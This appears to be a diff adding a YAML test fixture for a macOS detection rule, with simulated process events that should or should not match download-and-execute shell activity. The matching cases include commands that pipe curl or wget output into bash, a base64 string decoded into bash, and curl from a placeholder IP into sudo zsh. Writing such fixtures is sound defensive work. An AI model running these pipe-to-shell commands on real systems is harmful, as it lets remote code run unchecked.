@@ -1,0 +1,24 @@
+match:
+  - desc: 'sh -c "curl -sS https://.../echo-art-fish.sh | bash; wget ... | bash" (ART T1059.004 #2)'
+    events:
+      - name: CreateProcess
+        proc: {pid: 5201, ppid: 5200, exe: /bin/sh, name: sh, cmdline: "sh -c curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\nwget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash", args: [sh, -c, "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\nwget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash"], uid: 501, euid: 501, signing_id: com.apple.sh, is_platform: true, is_signed: true}
+  - desc: 'sh -c "echo <b64> | base64 -d | bash" (ART T1140 #9)'
+    events:
+      - name: CreateProcess
+        proc: {pid: 5202, ppid: 5200, exe: /bin/sh, name: sh, cmdline: "sh -c echo IyEvYmluL2Jhc2gKZWNobyAiaGVsbG8iCg== | base64 -d | bash", args: [sh, -c, "echo IyEvYmluL2Jhc2gKZWNobyAiaGVsbG8iCg== | base64 -d | bash"], uid: 501, euid: 501, signing_id: com.apple.sh, is_platform: true, is_signed: true}
+  - desc: osascript do shell script spawns sh -c with curl | sudo /bin/zsh
+    events:
+      - name: CreateProcess
+        proc: {pid: 5203, ppid: 5204, exe: /bin/sh, name: sh, cmdline: "/bin/sh -c curl -fsSL http://203.0.113.7/i | sudo /bin/zsh", args: [/bin/sh, -c, "curl -fsSL http://203.0.113.7/i | sudo /bin/zsh"], uid: 501, euid: 501, signing_id: com.apple.sh, is_platform: true, is_signed: true}
+nomatch:
+  - desc: benign lookalike - curl piped into jq / shasum, not a shell
+    events:
+      - name: CreateProcess
+        proc: {pid: 5211, ppid: 5210, exe: /bin/zsh, name: zsh, cmdline: "zsh -c curl -s https://api.github.com/repos/x/y/releases/latest | jq -r .tag_name", args: [zsh, -c, "curl -s https://api.github.com/repos/x/y/releases/latest | jq -r .tag_name"], uid: 501, euid: 501, signing_id: com.apple.zsh, is_platform: true, is_signed: true}
+      - name: CreateProcess
+        proc: {pid: 5212, ppid: 5210, exe: /bin/sh, name: sh, cmdline: "sh -c curl -sL https://example.com/tool.tgz | shasum -a 256", args: [sh, -c, "curl -sL https://example.com/tool.tgz | shasum -a 256"], uid: 501, euid: 501, signing_id: com.apple.sh, is_platform: true, is_signed: true}
+  - desc: benign lookalike - curl downloads to a file, the script is run later by path
+    events:
+      - name: CreateProcess
+        proc: {pid: 5213, ppid: 5210, exe: /bin/bash, name: bash, cmdline: "bash -c curl -fsSLo install.sh https://example.com/install.sh && bash install.sh", args: [bash, -c, "curl -fsSLo install.sh https://example.com/install.sh && bash install.sh"], uid: 501, euid: 501, signing_id: com.apple.bash, is_platform: true, is_signed: true}
